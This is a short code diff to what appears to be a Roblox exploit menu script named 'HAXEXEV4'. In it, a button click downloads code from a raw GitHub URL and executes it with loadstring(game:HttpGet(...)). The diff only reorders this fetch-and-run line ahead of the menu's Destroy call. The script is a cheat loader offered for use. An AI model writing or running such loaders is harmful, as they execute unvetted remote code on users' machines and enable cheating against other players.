@@ -369,8 +369,9 @@ local function OBUVZQ_fake_script() -- RS.LocalScript
 	local script = Instance.new('LocalScript', RS)
 
 	RS.MouseButton1Click:Connect(function()
-		HAXEXEV4:Destroy()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/pepfre12/exe/hax"))()
+		HAXEXEV4:Destroy()
+		
 	end)
 end
 coroutine.wrap(OBUVZQ_fake_script)()
